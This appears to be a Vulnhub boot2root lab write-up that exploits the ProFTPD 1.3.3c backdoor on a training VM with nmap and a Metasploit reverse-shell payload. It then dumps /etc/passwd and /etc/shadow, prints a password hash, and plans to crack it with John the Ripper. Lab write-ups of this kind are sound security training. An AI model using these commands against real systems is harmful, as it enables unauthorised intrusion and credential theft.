|---|---|
|:---|:----|
| Category: |	Small boot2root VM |
|Platform: |	Vulnhub |
|Vulnerability: | Fpt |
|End Goal: |	Get root |
|Tool: | nmap,searchsploit, msfconsole |
|Tag:	| #ProFTPD 1.3.3c exploit |

## Pennetration Methodologie
- Scan the target
  - Find target's IP
  - Nmap scan
- Enumeration
  - FTP vuln scan
  - Searchsploit
- Exploit
  - Exploit ProFTPD 1.3.3c
  - Get root
## Walkthrough
### Scanning
- Firstly I find the target’s IP by using **netdiscover** tool, we can easily find ip of the victim machine
```
┌──(root㉿kali)-[/home/kali]
└─# netdiscover -i eth0 -r 192.168.44.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                                                               17 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1020                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.44.2    00:50:56:f2:22:8b      6     360  VMware, Inc.                                                                    
 192.168.44.1    00:50:56:c0:00:08      1      60  VMware, Inc.                                                                    
 192.168.44.130  00:0c:29:0e:97:6e      8     480  VMware, Inc.                                                                    
 192.168.44.254  00:50:56:e3:25:b0      2     120  VMware, Inc.
```
Target: **192.168.44.130** 
- Let's continue with **Nmap** scan.
```
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -sC -Pn -T4  192.168.44.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 17:24 EDT
Nmap scan report for 192.168.44.130
Host is up (0.00088s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:0E:97:6E (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```
From this we can see the following ports and services:
- 21/tcp open  ftp     ProFTPD 1.3.3c
- 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
- 80/tcp open  http    Apache httpd 2.4.18
Check http servive
![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/26e3bb4b-1690-4ca9-8e12-d8085bc0bbea)
Nothing here. Scan Web with nikto
### Enumeration
#### FTP vuln scan
Use Nmap vuln scan to find scan ftp service 
```
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -sC -Pn -T4 --script=vuln -p 21 192.168.44.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 17:35 EDT
Nmap scan report for 192.168.44.130
Host is up (0.0018s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
| ftp-proftpd-backdoor: 
|   This installation has been backdoored.
|   Command: id
|_  Results: uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```
From the result, there are a FTP vulnerability. we can exploited: **ftp-proftpd-backdoor**
## Exploit 
- FPT exploit
The frist I use **searchexploit** to find the way exploit
![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/08a13c0c-4031-4e9d-862d-2545d9e4d2e3)
I find the the way to exploit by using metasploit. Start **msfconsole** and set options to exploit.
```
msf6 > search ProFTPD 1.3.3c
msf6 > use 0
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.44.130
RHOSTS => 192.168.44.130
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload payload/cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.168.44.20
LHOST => 192.168.44.20
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
```
When exploit successful, you get a shell. Using command **python -c 'import pty;pty.spawn.("/bin/sh")'**
![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/b1e4821a-5a7b-4616-8b5f-188601268040)
Using command **id** to get current user'IP.
![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/7894b801-a967-4fdb-a3a6-f14ae862c5fd)

Dump file /etc/passwd and /etc/shadow
```
echo "marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::" >> shadow.txt

echo "marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash" >> passwd.txt

```
So we can crack it with **john the ripper**.



